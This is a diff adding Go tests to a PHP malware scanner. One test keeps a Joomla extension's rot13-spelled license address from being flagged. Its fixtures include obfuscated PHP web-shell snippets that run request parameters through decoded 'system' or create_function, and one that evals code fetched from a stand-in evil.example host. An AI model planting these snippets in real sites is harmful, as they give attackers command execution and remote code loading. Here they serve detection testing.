@@ -1461,3 +1461,35 @@ func TestFleetJoomlaPageCache(t *testing.T) {
 		}
 	}
 }
+
+// business600 joomlash (2026-10-27): JSitemap Pro's AjaxserverModel.php and
+// the JExtStore packages in jdownloads (JComments, GDPR, JSpeed …) were
+// quarantined as PHP.Obfuscated.SplitFunctionName: the vendor spells
+// str_rot13 in pieces to build its own license and update address. A split
+// decoder whose result is code or a function name, or that reads request
+// data, is still caught.
+func TestFleetJExtStoreLicenseAddress(t *testing.T) {
+	s := newScanner(t)
+	path := "/home/u/public_html/administrator/components/com_jmap/Model/AjaxserverModel.php"
+	vendor := "<?php\ndefined('_JEXEC') or die('Restricted access');\nclass AjaxserverModel {\n" +
+		"\tprivate function getLicenseStatus() {\n\t\t$code = 'x';\n\t\t$cdFuncUsed = 'str_' . 'ro' . 't' . '13';\n" +
+		"\t\t$r = $this->http->get($cdFuncUsed('uggc' . '://' . 'fgberwrkgrafvbaf' . '.bet') . \"/option,com_easycommerce/action,licenseCode/email,$code\");\n\t\treturn $r;\n\t}\n" +
+		"\tprivate function downloadComponentUpdate() {\n\t\t$cdFuncUsed = 'str_' . 'ro' . 't' . '13';\n" +
+		"\t\t$ep = $cdFuncUsed('uggc' . '://' . 'fgberwrkgrafvbaf' . '.bet' . '/XZY1406TSPQnifs3243560923kfuxnj35td1rtt45664f.ugzy');\n\t\treturn $ep;\n\t}\n" +
+		"\tpublic function loadAjaxEntity($id, $param) { return $this->$id($param); }\n}\n"
+	if d := s.checkContent(path, ".php", []byte(vendor)); d != nil {
+		t.Errorf("JExtStore license address: %s", d.Signature)
+	}
+	bad := map[string]string{
+		"decoded function name called": "<?php $f = 'str_' . 'ro' . 't' . '13'; $f('flfgrz')($_GET['c']);",
+		"decoded name kept and called":  "<?php $f = 'str_' . 'ro' . 't' . '13'; $g = $f('flfgrz'); $g($_GET['c']);",
+		"decoder on request data":       "<?php $f = 'base' . '64_' . 'decode'; $g = 'cre' . 'ate_' . 'function'; $x = $f($_POST['p']); $y = $g('', $x); $y();",
+		"decoded url then eval":         "<?php $f = 'base' . '64_' . 'decode'; eval(file_get_contents($f('aHR0cDovL2V2aWwuZXhhbXBsZS94')));",
+		"decoder passed on":             "<?php $f = 'str_' . 'ro' . 't' . '13'; $n = array_map($f, ['flfgrz']); $h = $n[0]; $h($_GET['c']);",
+	}
+	for name, body := range bad {
+		if d := s.checkContent("/home/u/public_html/x.php", ".php", []byte(body)); d == nil || d.Category != CatVirus {
+			t.Errorf("%s not caught: %+v", name, d)
+		}
+	}
+}
